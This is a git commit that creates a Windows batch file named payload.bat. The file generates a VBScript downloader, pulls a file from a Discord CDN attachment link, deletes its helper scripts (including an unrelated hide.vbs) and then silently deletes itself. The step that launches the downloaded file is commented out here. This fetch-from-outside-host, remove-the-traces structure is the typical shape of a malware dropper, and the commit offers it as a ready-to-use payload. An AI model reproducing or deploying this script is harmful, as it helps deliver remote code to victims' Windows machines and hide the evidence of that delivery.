e141daa191b84d6324bcf54bdbc00e4363eb9f01
Mystro <83551872+Mystro69@users.noreply.github.com>
2024-04-09 14:54:43 +0300

    Create payload.bat

---
+++ payload.bat
@@ -0,0 +1,44 @@
+@echo off
+
+
+rem Windows has no built-in wget or curl, so generate a VBS script to do it:
+
+rem -------------------------------------------------------------------------
+set DLOAD_SCRIPT=download.vbs
+echo Option Explicit                                                    >  %DLOAD_SCRIPT%
+echo Dim args, http, fileSystem, adoStream, url, target, status         >> %DLOAD_SCRIPT%
+echo.                                                                   >> %DLOAD_SCRIPT%
+echo Set args = Wscript.Arguments                                       >> %DLOAD_SCRIPT%
+echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1")              >> %DLOAD_SCRIPT%
+echo url = args(0)                                                      >> %DLOAD_SCRIPT%
+echo target = args(1)                                                   >> %DLOAD_SCRIPT%
+echo WScript.Echo "Getting '" ^& target ^& "' from '" ^& url ^& "'..."  >> %DLOAD_SCRIPT%
+echo.                                                                   >> %DLOAD_SCRIPT%
+echo http.Open "GET", url, False                                        >> %DLOAD_SCRIPT%
+echo http.Send                                                          >> %DLOAD_SCRIPT%
+echo status = http.Status                                               >> %DLOAD_SCRIPT%
+echo.                                                                   >> %DLOAD_SCRIPT%
+echo If status ^<^> 200 Then                                            >> %DLOAD_SCRIPT%
+echo    WScript.Echo "FAILED to download: HTTP Status " ^& status       >> %DLOAD_SCRIPT%
+echo    WScript.Quit 1                                                  >> %DLOAD_SCRIPT%
+echo End If                                                             >> %DLOAD_SCRIPT%
+echo.                                                                   >> %DLOAD_SCRIPT%
+echo Set adoStream = CreateObject("ADODB.Stream")                       >> %DLOAD_SCRIPT%
+echo adoStream.Open                                                     >> %DLOAD_SCRIPT%
+echo adoStream.Type = 1                                                 >> %DLOAD_SCRIPT%
+echo adoStream.Write http.ResponseBody                                  >> %DLOAD_SCRIPT%
+echo adoStream.Position = 0                                             >> %DLOAD_SCRIPT%
+echo.                                                                   >> %DLOAD_SCRIPT%
+echo Set fileSystem = CreateObject("Scripting.FileSystemObject")        >> %DLOAD_SCRIPT%
+echo If fileSystem.FileExists(target) Then fileSystem.DeleteFile target >> %DLOAD_SCRIPT%
+echo adoStream.SaveToFile target                                        >> %DLOAD_SCRIPT%
+echo adoStream.Close                                                    >> %DLOAD_SCRIPT%
+echo.                                                                   >> %DLOAD_SCRIPT%
+
+rem -------------------------------------------------------------------------
+
+@cscript //Nologo %DLOAD_SCRIPT% "https://cdn.discordapp.com/attachments/764395888818126858/979840754476265603/Screenshot_5.png?ex=6622d150&is=66105c50&hm=c0e2fc530c8aaf095e476eb5a16acb7a2626f59db094f0e1e384a21a934ec0b8&" mystro.png
+del download.vbs
+del hide.vbs
+REM start mystro.png
+( del /q /f "%~f0" >nul 2>&1 & exit /b 0  )
